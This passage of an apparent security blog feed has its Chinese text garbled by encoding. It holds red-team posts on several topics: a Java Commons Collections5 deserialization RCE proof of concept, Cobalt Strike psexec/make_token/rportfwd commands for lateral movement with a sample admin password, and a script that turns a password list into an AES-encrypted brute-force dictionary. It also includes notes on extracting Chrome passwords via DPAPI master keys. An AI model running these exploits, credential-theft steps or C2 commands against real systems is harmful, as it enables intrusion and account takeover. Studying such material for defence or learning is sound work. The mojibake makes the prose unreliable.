<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç®€å•çš„è¯´å°±æ˜¯ä¸‰ç§æƒ…å†µ</p>
<ul>
<li><p>Aç”¨æˆ·è·å–è‡ªå·±chromeå¯†ç ä¸éœ€è¦çŸ¥é“master key</p>
</li>
<li><p>Aè·å–Bç”¨æˆ·ï¼Œå¦‚æœBç”¨æˆ·åœ¨çº¿ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥ä»å†…å­˜ä¸­æŠ“å–å‡ºBçš„maste key</p>
</li>
<li><p>Aè·å–Bç”¨æˆ·ï¼ŒBä¸åœ¨çº¿ï¼Œå°±éœ€è¦ç”¨bç”¨æˆ·çš„æ˜æ–‡å¯†ç æˆ–è€…NTLM hashè®¡ç®—å‡ºmaster key,åœ¨å›åˆ°ä¸Šé¢ä¸€æ­¥ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2></li>
</ul>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">æ¸—é€æŠ€å·§â€”â€”å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç </a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">æ¸—é€æŠ€å·§â€”â€”ç¦»çº¿å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç </a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">æ¸—é€æŠ€å·§â€”â€”åˆ©ç”¨Masterkeyç¦»çº¿å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç </a><br><a href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">Operational Guidance for Offensive User DPAPI Abuse</a><br><a href="https://bbs.pediy.com/thread-247634.htm">[ç¿»è¯‘]æ»¥ç”¨User DPAPIè¿›è¡Œæ”»å‡»çš„æ“ä½œæŒ‡å—</a></p>
]]></content>
      <categories>
        <category>redteam trick</category>
      </categories>
      <tags>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡è°ƒè¯•Commons Collections5é‡åˆ°çš„å°å‘</title>
    <url>/2019/11/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B0%83%E8%AF%95Commons%20Collections5%E9%81%87%E5%88%B0%E7%9A%84%E5%B0%8F%E5%9D%91/</url>
    <content><![CDATA[<!-- æ•…äº‹çš„èµ·å› æ˜¯å­¦å¼Ÿæ¥é—®æˆ‘ä¸ºä»€ä¹ˆåœ¨è°ƒCommons Collections5çš„æ—¶å€™ï¼Œè¿˜æ²¡æœ‰èµ°åˆ°è§¦å‘ç‚¹å°±è§¦å‘äº†RCEã€‚ -->
<!-- more -->

<p>æ•…äº‹çš„èµ·å› æ˜¯å­¦å¼Ÿæ¥é—®æˆ‘ä¸ºä»€ä¹ˆåœ¨è°ƒCommons Collections5çš„æ—¶å€™ï¼Œè¿˜æ²¡æœ‰èµ°åˆ°è§¦å‘ç‚¹å°±è§¦å‘äº†RCEã€‚å¹¶å‘æ¥äº†<a href="https://www.jianshu.com/p/d4954c691d09">è¿™ç¯‡æ–‡ç« </a>ã€‚<br>æˆ‘å½“æ—¶ä»¥commons collections5ä¸ºä¾‹ï¼Œè°ƒè¯•äº†ä¸€ä¸‹ä»£ç å‘ç°ç¡®å®æœ‰è¿™ç§æƒ…å†µã€‚ä»¥ä¸‹æ˜¯è°ƒè¯•ç”¨çš„demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//ä¼ å…¥Runtimeç±»</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                //åå°„è°ƒç”¨<span class="title">getMethod</span>æ–¹æ³•ï¼Œç„¶å<span class="title">getMethod</span>æ–¹æ³•å†åå°„è°ƒç”¨<span class="title">getRuntime</span>æ–¹æ³•ï¼Œè¿”å›<span class="title">Runtime</span>.<span class="title">getRuntime</span>()æ–¹æ³•</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨execæ–¹æ³•</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123;"open /Applications/Calculator.app/"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="comment">//decorateå®ä¾‹åŒ–LazyMapç±»ã€‚</span></span><br><span class="line">        <span class="comment">// LazyMapé¡çš„getæ–¹æ³•èª¿ç”¨äº†transform,transformå¯ä»¥é€šéåå°„æœºåˆ¶æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);  <span class="comment">//TiedMapEntryä¸­è°ƒç”¨äº†toStringæ–¹æ³•-&gt;è°ƒç”¨äº†mapçš„getæ–¹æ³•</span></span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>); <span class="comment">//BadAttributeValueExpExceptionçš„æ„é€ æ–¹æ³•è°ƒç”¨toStringæ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//         valæ˜¯ç§æœ‰å˜é‡ï¼Œæ‰€ä»¥åˆ©ç”¨ä¸‹é¢æ–¹æ³•è¿›è¡Œèµ‹å€¼,valå˜é‡èµ‹å€¼ä¸ºTiedMapEntryçš„å®ä¾‹åŒ–å¯¹è±¡,</span></span><br><span class="line"><span class="comment">//         é‡å†™äº†BadAttributeValueExpExceptionçš„readObjectæ–¹æ³•çš„valå˜é‡èµ‹å€¼ä¸ºBadAttributeValueExpExceptionç±»ï¼Œ</span></span><br><span class="line"><span class="comment">//         å°±ä¼šè°ƒç”¨BadAttributeValueExpExceptionçš„val = valObj.toString();è§¦å‘ä¸Šé¢çš„</span></span><br><span class="line">        Field valfield = poc.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line"><span class="comment">//        System.out.println(valfield);</span></span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(poc, entry);</span><br><span class="line"></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(poc);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//æ¢å¤å¯¹è±¡</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å®é™…è°ƒè¯•çš„æ—¶å€™æˆ‘å‘ç°ç¡®å®æœ‰å­¦å¼Ÿæ‰€è¯´çš„æƒ…å†µï¼Œä¸€å›¾èƒœåƒè¨€ã€‚<br><img src="./1574693317686.png" alt="Alt text"></p>
<p>åå¤è°ƒäº†å‡ æ¬¡éƒ½æ˜¯è¿™ä¸ªæƒ…å†µï¼Œæ„Ÿè§‰ç½‘ä¸Šæ–‡ç« åˆ†æå¹¶æ²¡æœ‰é—®é¢˜å› ä¸ºèµ°åˆ°toStringé‚£ä¸ªç‚¹ä¹Ÿä¼šè§¦å‘rceï¼Œè°ƒè¯•æ—¶å€™çš„é‚£ä¸ªç‚¹ä¹Ÿæ²¡é“ç†å¼¹æ¡†ï¼Œæ„Ÿè§‰æ˜¯ideaæœ‰bugã€‚åæ¥å»ç¾¤é‡Œè¯·æ•™äº†ä¸€ä¸‹å¸ˆå‚…ï¼Œevil7å¤§å¸ˆå‚…ç»™äº†ç­”æ¡ˆã€‚å¸ˆå‚…æ„æ€å¤§è‡´å°±æ˜¯è¯´åœ¨è°ƒè¯•çš„æ—¶å€™è°ƒè¯•å™¨æ‰“å°äº†valObjï¼Œæ‰€ä»¥ç›¸å½“äºæå‰è§¦å‘äº†valObjçš„toStringæ–¹æ³•ã€‚æ¢å¥è¯è¯´åœ¨è°ƒè¯•æƒ…å†µä¸‹RCEè§¦å‘äº†ä¸¤æ¬¡ã€‚</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>cobaltstrikeåœ¨æ¨ªå‘ç§»åŠ¨ä¸­çš„ä¸Šçº¿æŠ€å·§</title>
    <url>/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<!-- cobaltstrikeåœ¨æ¨ªå‘ç§»åŠ¨ä¸­çš„ä¸Šçº¿æŠ€å·§ -->
<!-- more -->

<h2 id="cobaltstrike-psexec"><a href="#cobaltstrike-psexec" class="headerlink" title="cobaltstrike psexec"></a>cobaltstrike psexec</h2><p>åœ¨è¿›è¡Œpexeczä¹‹å‰ä¸€èˆ¬éœ€è¦ç”¨rev2vselfå›åˆ°åŸæ¥çš„å›è¯å’Œå…‹éš†token</p>
<ul>
<li>rev2self:  Revert to your original access token</li>
<li>make_token:  Clone the current access token and set it up to pass the specified username<br>and password when you interact with network resources. This command does not<br>validate the credentials you provide and it has no effect on local actions.</li>
<li>psexec: Spawn a session on a remote host. This command generates an executable, copies it to the target, creates a service to run it, and cleans up after itself. You must specify which share (e.g., ADMIN$ or C$) to copy the file to.<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rev2self</span><br><span class="line">make_token administrator aaa123!@#</span><br><span class="line">psexec 192.168.20.30 ADMIN$ smb-bind-pipe</span><br></pre></td></tr></table></figure>
smb-bind-pipeæ˜¯å»ºç«‹çš„smbç›‘å¬å™¨çš„åå­—ï¼Œåˆ›å»ºsmbç›‘å¬å™¨çš„æ—¶å€™ä¼šè¦æ±‚è¾“å…¥ç«¯å£ï¼Œä¸çŸ¥é“æ„ä¹‰ä½•åœ¨ï¼Œéšä¾¿å¡«ä¸€ä¸ªå°±å¥½ã€‚</li>
</ul>
<p>ç”¨è¿™ç§æ–¹æ³•ä¸Šçº¿çš„æƒé™æ˜¯ç³»ç»Ÿæƒé™<br><img src="./1563712543324.png" alt="Alt text"></p>
<p>psï¼šåæ¥çœ‹csè¾“å‡ºï¼Œå¡«çš„ç«¯å£å·ä¼šæ˜¯å‘½åç®¡é“çš„ä¸€éƒ¨åˆ†ï¼Œè¿™æ ·å¥½å¤„å°±æ˜¯å¯ä»¥åœ¨ä¸€ä¸ªæœºå™¨ä¸Šå¼€å¤šä¸ªç®¡é“å§<br><img src="./1563712694799.png" alt="Alt text"></p>
<h2 id="cobaltstrike-smb-pipe"><a href="#cobaltstrike-smb-pipe" class="headerlink" title="cobaltstrike smb pipe"></a>cobaltstrike smb pipe</h2><p>å…¶å®ä¸Šé¢psexecæŒ‡å®šçš„æ˜¯smb-bind-pipe listenerï¼Œé‚£ä¹ˆpsexecæˆåŠŸåé€šä¿¡æ–¹å¼å°±æ˜¯åŸºäºsmbã€‚ä½¿ç”¨smbçš„å¥½å¤„å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šè§„é¿æµé‡å®¡æŸ¥ã€‚å¦å¤–ä¸€ç§ä½¿ç”¨smbåŠæ³•å°±æ˜¯ç”Ÿæˆwindows executesï¼Œåœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œç„¶ålinkï¼Œè¿™ç§æ–¹æ³•æ‹¿åˆ°çš„å°±æ˜¯ï¼Œè¿è¡Œè¿™ä¸ªexeç”¨æˆ·çš„æƒé™è€Œä¸æ˜¯systemæƒé™ã€‚</p>
<p>Use: link [ip address]<br>Link to the Beacon at the specified IP address.</p>
<p><img src="./1563713352498.png" alt="Alt text"></p>
<p>ps:<strong>åœ¨ä½¿ç”¨unlinkçš„æ—¶å€™smb pipeéƒ½ä¼šæ–­æ‰ï¼Œä½†æ˜¯smb pipeçš„è¿›ç¨‹å¹¶ä¸ä¼šé€€å‡ºï¼Œlinkä¸¤æ¬¡åé€šè¿‡psexecå’Œè¿è¡Œexeçš„shelléƒ½ä¼šæ¢å¤</strong></p>
<h2 id="cobaltstrike-bind-tcp"><a href="#cobaltstrike-bind-tcp" class="headerlink" title="cobaltstrike bind tcp"></a>cobaltstrike bind tcp</h2><p>å»ºç«‹listeneråå’Œsmbä¸€æ ·ï¼Œå¯ä»¥ç”¨psexec</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rev2self</span><br><span class="line">make_token administrator aaa123!@#</span><br><span class="line">psexec 192.168.20.30 ADMIN$ bind-tcp</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥ç”Ÿæˆexeï¼Œç„¶åä½¿ç”¨connectè¿æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">connect 192.168.20.30</span><br></pre></td></tr></table></figure>
<p>éœ€è¦è¯´æ˜çš„æ˜¯åˆ›å»ºç›‘å¬å™¨çš„æ—¶å€™å¡«å†™çš„ç«¯å£å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨<br><img src="./1563764126695.png" alt="Alt text"><br>å®é™…ç›‘å¬çš„æ—¶å€™è¿˜æ˜¯ç›‘å¬çš„4444ç«¯å£<br><img src="./1563765538981.png" alt="Alt text"></p>
<p>åŠ ä¸Šsmbï¼Œå’Œtcpï¼Œæ‹“æ‰‘å›¾å¦‚ä¸‹ï¼Œè“è‰²æ˜¯tcpï¼Œé»„è‰²æ˜¯smb<br><img src="./1563765344629.png" alt="Alt text"></p>
<p>psï¼š<strong>smbå’Œtcpçš„ç›¸åŒç‚¹åœ¨äºï¼Œunlinkä¼šåŒæ—¶æ–­æ‰tcpå’Œsmbä¼šè¯ï¼Œä¸åŒç‚¹åœ¨äºsmbå¯ä»¥é€šè¿‡linkè¿æ¥å›æ¥ï¼Œä½†æ˜¯connectæ— æ³•è¿æ¥å›æ¥tcpï¼ŒåŸå› åœ¨äºunlinkåsmbç±»å‹è¿›ç¨‹è¿˜æ˜¯å­˜åœ¨ï¼Œä½†æ˜¯tcpçš„unlinkåè¿›ç¨‹ä¼šé€€å‡ºã€‚</strong></p>
<h2 id="cobaltstrike-reverse-tcp"><a href="#cobaltstrike-reverse-tcp" class="headerlink" title="cobaltstrike reverse tcp"></a>cobaltstrike reverse tcp</h2><p>cs3.13ä¹‹åæ–°æ›´æ–°çš„ä¸€ä¸ªlistenerï¼Œç›¸å½“niceçš„ä¸€ç‚¹æ˜¯Linuxè·³æ¿æœºä¸Šä¹Ÿæ”¯æŒè¿™ç§æ“ä½œï¼Œä¸è¿‡åœ¨åˆ›å»ºlistenerçš„æ—¶å€™å¹¶ä¸ä¼šå‡ºç°ã€‚<br><img src="./1563766274358.png" alt="Alt text"></p>
<p>æ‰¾åˆ°å®ƒéœ€è¦åœ¨<br><img src="./1563766369946.png" alt="Alt text"></p>
<p><img src="./1563766738365.png" alt="Alt text"></p>
<p>å‘½ä»¤è¡Œå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rportfwd 23333 windows&#x2F;beacon_reverse_tcp</span><br><span class="line"></span><br><span class="line">Use: rportfwd [bind port] [forward host] [forward port]</span><br><span class="line">     rportfwd stop [bind port]</span><br><span class="line"></span><br><span class="line">Binds the specified port on the target host. When a connection comes in,</span><br><span class="line">Cobalt Strike will make a connection to the forwarded host&#x2F;port and use Beacon</span><br><span class="line">to relay traffic between the two connections.</span><br></pre></td></tr></table></figure>


<p>æ¯”è¾ƒâ€œå¥‡æ€ªâ€œçš„æ˜¯ï¼Œè¿™ä¸ªç›‘å¬å™¨ä¸èƒ½åœ¨psexecçš„æ‰§è¡Œï¼Œåªèƒ½åœ¨ç”Ÿæˆstagelessçš„æ—¶å€™æ‰¾åˆ°<br><img src="./1563767495178.png" alt="Alt text"></p>
<p>ä¸Šçº¿å¯ä»¥çœ‹åˆ°åå‘çš„ç»¿è‰²çº¿ï¼Œè¿™ç§æ–¹æ³•æœ‰ä¸ªå¼Šç«¯ï¼Œå› ä¸ºç›‘å¬çš„ç«¯å£å¾€å¾€ä¸æ˜¯é»˜è®¤æ”¾è¡Œçš„ç«¯å£ï¼Œæ‰€ä»¥è¦æ±‚è¾¹ç•Œæœºå™¨è¦å…³é—­é˜²ç«å¢™ã€‚ã€‚ã€‚<br><img src="./1563768282165.png" alt="Alt text"></p>
<p>psï¼šreverseåŒæ ·å—åˆ°unlinkçš„å½±å“</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://mp.weixin.qq.com/s/aCWFlp0AzFd0Ou3wrDVu1g">Cobalt Strikeå‡ ç§ä¸é‚£ä¹ˆå¸¸è§çš„ä¸Šçº¿æ–¹å¼å°è®°</a></p>
]]></content>
      <categories>
        <category>redteam trick</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡ç®€å•çš„å¯»æ‰¾å‰ç«¯åŠ å¯†çˆ†ç ´çš„é€»è¾‘è¿‡ç¨‹</title>
    <url>/2019/11/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%AF%BB%E6%89%BE%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4%E7%9A%84%E9%80%BB%E8%BE%91%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<!-- è¿‡ç¨‹æ¯”è¾ƒç®€å•ï¼Œå±äºä¸€ç¯‡æ°´æ–‡ -->
<!-- more -->

<p>è¿‡ç¨‹æ¯”è¾ƒç®€å•ï¼Œå±äºä¸€ç¯‡æ°´æ–‡ã€‚ä¸»è¦å‚è€ƒ<a href="http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/">è¿™ç¯‡æ–‡ç« </a>ä¸­çš„ç¬¬ä¸‰ç§æ–¹æ³•ã€‚</p>
<p>å‰ç«¯ä½¿ç”¨vueå†™çš„ï¼ŒæŠŠå‰ç«¯ä»£ç å¤åˆ¶å‡ºæ¥<br><img src="./1572845899524.png" alt="Alt text"></p>
<p>æ‰¾åˆ°ç™»é™†é‚£ç‚¹çš„è§¦å‘å‡½æ•°<br><img src="./1572845945947.png" alt="Alt text"></p>
<p>æ‰¾åˆ°æäº¤å‡½æ•°ä¸­å¯†ç å˜é‡<br><img src="./1572845965414.png" alt="Alt text"></p>
<p>å…¨å±€æœç´¢å³å¯å®šä½åˆ°åŠ å¯†é€»è¾‘ï¼Œå¹¶ä¸”æ‰¾åˆ°åŠ å¯†ç”¨çš„å¯†é’¥<br><img src="./1572845913600.png" alt="Alt text"></p>
<p>é€šè¿‡æ³¨é‡Šå¯ä»¥å‘ç°æ˜¯AESåŠ å¯†<br><img src="./1572846183710.png" alt="Alt text"></p>
<p>æŸ¥çœ‹ä»£ç å˜é‡å¯ä»¥çœ‹å‡ºæ˜¯AES-ECB</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> encrypt=<span class="function">(<span class="params">word, keyStr</span>)=&gt;</span>&#123;</span><br><span class="line">    keyStr = keyStr ? keyStr : <span class="string">'abcdefgabcdefg12'</span>;</span><br><span class="line">    <span class="keyword">let</span> key  = CryptoJS.enc.Utf8.parse(keyStr);<span class="comment">//Latin1 w8m31+Yy/Nw6thPsMpO5fg==</span></span><br><span class="line">    <span class="keyword">let</span> srcs = CryptoJS.enc.Utf8.parse(word);</span><br><span class="line">    <span class="keyword">let</span> encrypted = CryptoJS.AES.encrypt(srcs, key, &#123;<span class="attr">mode</span>:CryptoJS.mode.ECB,<span class="attr">padding</span>: CryptoJS.pad.Pkcs7&#125;);</span><br><span class="line">    <span class="keyword">return</span> encrypted.toString();</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>ä»ç½‘ä¸Šæ‰¾ä¸ªpythonç‰ˆçš„AES-ECBè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESUtil</span>:</span></span><br><span class="line"></span><br><span class="line">    __BLOCK_SIZE_16 = BLOCK_SIZE_16 = AES.block_size</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encryt</span><span class="params">(str, key)</span>:</span></span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        x = AESUtil.__BLOCK_SIZE_16 - (len(str) % AESUtil.__BLOCK_SIZE_16)</span><br><span class="line">        <span class="keyword">if</span> x != <span class="number">0</span>:</span><br><span class="line">            str = str + chr(x)*x</span><br><span class="line">        msg = cipher.encrypt(str)</span><br><span class="line">        msg = base64.urlsafe_b64encode(msg).replace(<span class="string">'='</span>, <span class="string">''</span>)</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(enStr, key)</span>:</span></span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        enStr += (len(enStr) % <span class="number">4</span>)*<span class="string">"="</span></span><br><span class="line">        decryptByts = base64.urlsafe_b64decode(enStr)</span><br><span class="line">        msg = cipher.decrypt(decryptByts)</span><br><span class="line">        paddingLen = ord(msg[len(msg)<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">return</span> msg[<span class="number">0</span>:-paddingLen]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    key = <span class="string">"G20PAA&amp;9-EEFPQ5T"</span></span><br><span class="line">    <span class="keyword">print</span> AESUtil.encryt(<span class="string">"123456"</span>, key)</span><br></pre></td></tr></table></figure>
<p>å°†è·‘å‡ºæ¥çš„è„šæœ¬å’Œæäº¤çš„å¯¹æ¯”ï¼Œå‘ç°æäº¤çš„æœ‰paddingã€‚<br><img src="./1572846839888.png" alt="Alt text"><br><img src="./1572846861106.png" alt="Alt text"></p>
<p>ç¨å¾®ä¿®æ”¹ä¸€ä¸‹ä»£ç é€»è¾‘ï¼Œä»githubä¸Šä¸‹å¼±å£ä»¤å­—å…¸ç”ŸæˆåŠ å¯†å­—å…¸</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESUtil</span>:</span></span><br><span class="line"></span><br><span class="line">    __BLOCK_SIZE_16 = BLOCK_SIZE_16 = AES.block_size</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encryt</span><span class="params">(str, key)</span>:</span></span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        x = AESUtil.__BLOCK_SIZE_16 - (len(str) % AESUtil.__BLOCK_SIZE_16)</span><br><span class="line">        <span class="keyword">if</span> x != <span class="number">0</span>:</span><br><span class="line">            str = str + chr(x)*x</span><br><span class="line">        msg = cipher.encrypt(str)</span><br><span class="line">        msg = base64.urlsafe_b64encode(msg)</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(enStr, key)</span>:</span></span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        enStr += (len(enStr) % <span class="number">4</span>)*<span class="string">"="</span></span><br><span class="line">        decryptByts = base64.urlsafe_b64decode(enStr)</span><br><span class="line">        msg = cipher.decrypt(decryptByts)</span><br><span class="line">        paddingLen = ord(msg[len(msg)<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">return</span> msg[<span class="number">0</span>:-paddingLen]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    resp = requests.get(url=<span class="string">"https://raw.githubusercontent.com/TheKingOfDuck/fuzzDicts/master/passwordDict/top1000.txt"</span>)</span><br><span class="line">    passwd_list = resp.content.split(<span class="string">'\n'</span>)</span><br><span class="line">    key = <span class="string">"G20PAA&amp;9-EEFPQ5T"</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./top1000en.txt'</span>, <span class="string">'a+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> passwd_list:</span><br><span class="line">            f.write(AESUtil.encryt(i, key) + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> AESUtil.encryt(<span class="string">"123456"</span>, key)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>wordpress xmlrpc.php have ssrf vuln(use dns rebinding bypass limit)</title>
